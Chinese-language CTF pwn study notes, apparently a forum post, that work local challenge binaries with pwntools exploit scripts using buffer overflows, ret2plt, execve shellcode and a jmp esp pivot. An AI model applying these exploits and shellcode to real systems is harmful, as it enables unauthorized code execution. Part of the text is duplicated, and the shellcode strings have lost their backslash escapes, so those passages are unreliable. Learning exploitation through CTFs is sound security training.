# [原创][新手向]Pwn学习笔记：CTF pwn题解题套路实战

解题套路：
1. 检查保护情况
2. 判断漏洞函数，如gets,scanf等
3. 计算目标变量的在堆栈中距离ebp的偏移
4. 分析是否已经载入了可以利用的函数，如system，execve等
5. 分析是否有字符串/bin/sh
### Pwn1
这道题包含了一个可以直接利用的可以返回shell的函数，现在的任务就是计算偏移，然后将shell函数的地址覆盖到相应的位置上就可以利用成功。
首先来查看一下该程序的保护情况，发现开启了堆栈保护（NX），是一个32bit的程序，因此需要在32位的linux环境下测试。

可以明显看到漏洞是在gets里面，gets接收输入存在缓冲区溢出漏洞，可以通过超长字符串溢出来利用此漏洞。
为了可以利用此漏洞，我们需要先计算输入的字符串的堆栈地址距离栈底ebp的位置，ebp的下一个地址就是返回地址的位置，在32位程序中是ebp+4。
由两种方法可以得到字符串距离返回地址的距离：1.手工计算；2.利用 pattern offset计算
先说手工计算：利用gdb的插件gef可以查找esp的地址，gdb附加程序，然后在gets函数位置下断点：b 0x080486AE

### Pwn2
这里没有可以直接利用的system（）函数，现在就只能使用系统调用来操作了，Syscall函数的调用规范是：execve（“bin/sh”，0,0）
对应的汇编代码是：
```
pop eax, # 系统调用号载入， execve为0xb
pop ebx, # 第一个参数， /bin/sh的string
pop ecx, # 第二个参数，0
pop edx, # 第三个参数，0
int 0x80, # 执行系统调用
```

发现实际的偏移是108个字节，覆盖点距离ebp，那么距离返回地址就应该是108+4=112字节
之前没找到字符串，因此这里我们需要想个办法，直观的想法是在shellcode中，在参数的位置直接放入字符串“/bin/sh”
```
payload = flat(['a' \* 112, system\_plt, 0xabcdabcd, “/bin/sh”])
```
但是放在堆栈中的是程序执行的指令，而不是实际的字符串，因此，按照上述方式放置字符串，system并不会读取”/bin/sh”，而是读取”/bin/sh”对应的4个字节的地址所指向的内存空间
![](upload/attach/201904/823237\_DMDF88FPSQSA2RK.png)
之后发现程序中还载入了函数gets，可以利用gets来读取用户输入的”/bin/sh”放置到某个地址空间去，接着system再调用它，“某个地址空间”可以是下面的buf2，可以发现它的地址是0x0804A080，这个空间可以让我们使用
![](upload/attach/201904/823237\_7GBKVKCV4RFX76S.png)
exp如下：
```python
##!/usr/bin/env python
from pwn import \*
sh = process('./pwn4')
shelf = ELF('./pwn4')
gets\_plt = shelf.plt['gets']
system\_plt = shelf.plt['system']
pop\_ebp = 0x0804872f
buf2 = 0x804a080
payload = flat(
['a' \* 112, gets\_plt, pop\_ebp, buf2, system\_plt, 0xabcdabcd, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```
Pop\_ebp的主要目的是让eip流向system的位置，并且取出system地址赋值给eip，Pop\_ebp其实不一定是pop ebp，pop任何其他的寄存器都可以，主要是利用该指令的esp+4的功能

但是由于堆栈可以执行，因此我们可以考虑直接将shellcode放在payload里面，因此，这里和下面分析是否有字符串/bin/sh合并了，我们可以自己放置字符串，并且调用对应的地址了
理论上，可以直接利用pwntools产生的shellcode来进行部署，但是这道题有点特殊。在返回地址之后所剩余的空间=64-24-8=32个字节（返回地址还要占用8个字节），因此实际部署shellcode的长度还剩下32个字节，使用pwntools产生的shellcode有44个字节，太长了。因此，我们可以从网上找到更短的shellcode：
```
# 23 bytes
# https://www.exploit-db.com/exploits/36858/
shellcode\_x64 = "x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05"
```
它的汇编形式是
```
# char \*const argv[]
xorl %esi, %esi
# 'h' 's' '/' '/' 'n' 'i' 'b' '/'
movq $0x68732f2f6e69622f, %rbx
# for 'x00'
pushq %rsi
pushq %rbx
pushq %rsp
# const char \*filename
popq %rdi
# \_\_NR\_execve 59
pushq $59
popq %rax
# char \*const envp[]
xorl %edx, %edx
syscall
```
现在的目标就是找到shellcode的地址，其实就是buf的地址加上32个字节的偏移，前面发现，该程序是动态改变地址的，因此静态的确认buf地址是不可行的，所以静态的确认shellcode的地址是不可行的。
发现程序中有printf函数，理论上可以利用它来打印buf的地址，然后实时的计算buf+32的地址，就能够得到shellcode的地址，它实际上已经为我们解决了这个问题，自己输出了buf的地址
![](upload/attach/201904/823237\_XE3A3E88HUWVCQV.png)
exp思路就是： 实时读取buf的地址，计算buf+32得到shellcode的地址，放置在payload中
```python
from pwn import \*
sh = process('./pwn5')
sh = ELF('./pwn5')
# 23 bytes
# https://www.exploit-db.com/exploits/36858/
shellcode\_x64 = "x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05"
sh.recvuntil('[')
buf\_addr = sh.recvuntil(']', drop=True)
buf\_addr = int(buf\_addr, 16)
payload = 'b' \* 24 + p64(buf\_addr + 32) + shellcode\_x64
sh.sendline(payload)
sh.interactive()
```

考虑利用shellcode，好像可以类似于上一题的操作了。但是并不能，留给我们布置shellcode的长度为50-36-4=10字节（同样有4个字节的返回地址存放）
这里可以考虑把shellcode放在栈里
![](upload/attach/201904/823237\_965B7BQZPWX7XHV.png)
这样就总共有0x20（36个字节）的位置存放shellcode的了。但是，要做到跳转到放置shellcode的位置，似乎并没有那么简单。要达到这个目的，我们需要做到以下几件事情：
1. 推算shellcode放置的地址
2. 跳转到shellcode放置的位置
首先，第一点，shellcode的位置就是发射payload的时候esp\_old的位置，我们可以推算出来，当程序提取完返回地址之后，esp指向的地址距离esp\_old的地址为0x20+4(ebp)+4(ret\_addr)=0x28。因此，我们需要用当前的esp-0x28，得到的就是shellcode的地址。
对于第二点，我们如何让eip顺利的依次取出我们设计好的路线图呢？在ret\_addr，我们需要寻找到一个gadget，它能够跳转到esp的位置，以继续往后执行栈上的代码。注意，这里我们为什么不直接将可执行的代码布置在ret\_addr的位置，因为这里是原本的函数提取返回函数地址的地方，它并不会执行这里位置的代码，而是执行这个位置的内容指向的地址的代码。我们需要jmp esp这个操作，来让程序流获得在栈上执行的权限。
![](upload/attach/201904/823237\_XSG6XZZED6JE224.png)
发现只有这么一个地址：0x08048504。注意，当我们取出ret\_addr里面的地址的时候，esp已经+4了，因此就会指向我们的下一步操作：跳转回esp\_old的位置。
直接可以选择让pwntools产生可执行的代码”sub esp 0x28; jmp esp”，这里可以是直接运行的代码，因为我们的程序已经开始在栈上执行了，而不再是取出地址了。

这里可以考虑把shellcode放在栈里

![](https://bbs.kanxue.com/upload/attach/201904/823237_965B7BQZPWX7XHV.png)

这样就总共有0x20（36个字节）的位置存放shellcode的了。但是，要做到跳转到放置shellcode的位置，似乎并没有那么简单。要达到这个目的，我们需要做到以下几件事情：

1. 推算shellcode放置的地址
2. 跳转到shellcode放置的位置

首先，第一点，shellcode的位置就是发射payload的时候esp\_old的位置，我们可以推算出来，当程序提取完返回地址之后，esp指向的地址距离esp\_old的地址为0x20+4(ebp)+4(ret\_addr)=0x28。因此，我们需要用当前的esp-0x28，得到的就是shellcode的地址。

对于第二点，我们如何让eip顺利的依次取出我们设计好的路线图呢？在ret\_addr，我们需要寻找到一个gadget，它能够跳转到esp的位置，以继续往后执行栈上的代码。注意，这里我们为什么不直接将可执行的代码布置在ret\_addr的位置，因为这里是原本的函数提取返回函数地址的地方，它并不会执行这里位置的代码，而是执行这个位置的内容指向的地址的代码。我们需要jmp esp这个操作，来让程序流获得在栈上执行的权限。

![](https://bbs.kanxue.com/upload/attach/201904/823237_XSG6XZZED6JE224.png)

发现只有这么一个地址：0x08048504。注意，当我们取出ret\_addr里面的地址的时候，esp已经+4了，因此就会指向我们的下一步操作：跳转回esp\_old的位置。

直接可以选择让pwntools产生可执行的代码”sub esp 0x28; jmp esp”，这里可以是直接运行的代码，因为我们的程序已经开始在栈上执行了，而不再是取出地址了。

exp：

```
from pwn import *

sh = process('./pwn6')

shellcode_x86 = "x31xc9xf7xe1x51x68x2fx2fx73"
shellcode_x86 += "x68x68x2fx62x69x6ex89xe3xb0"
shellcode_x86 += "x0bxcdx80"

sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
jmp_esp = 0x08048504
payload = shellcode_x86 + (
    0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp
sh.sendline(payload)
sh.interactive()
```
